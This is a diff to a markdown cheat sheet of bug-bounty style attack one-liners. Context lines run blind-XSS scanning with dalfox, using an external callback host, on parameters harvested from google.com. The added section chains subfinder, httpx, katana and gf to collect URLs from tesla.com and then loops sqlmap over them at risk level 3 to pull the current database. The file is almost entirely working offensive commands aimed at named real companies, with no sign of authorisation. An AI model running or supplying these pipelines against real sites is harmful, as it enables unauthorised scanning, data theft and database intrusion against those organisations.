@@ -1,4 +1,4 @@
-# Method 1
+# Common 
 
 ## domains
 ```bash 
@@ -102,4 +102,18 @@ python3 ~/tools/ParamSpider/paramspider.py --domain google.com -o param.txt
 
 ```bash
 dalfox -b l3gend.xss.ht file param.txt
+```
+
+## SQL Injection Mass Testing
+
+```bash
+subfinder -d tesla.com -silent -all | httpx -silent -threads 100 | katana -d 4 -jc -ef css,png,svg,ico,woff,gif | tee -a urls
+```
+
+```bash
+cat urls | gf sqli | tee -a sqli
+```
+
+```bash
+while read line;do sqlmap -u $line --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --risk 3;done < sqli
 ```
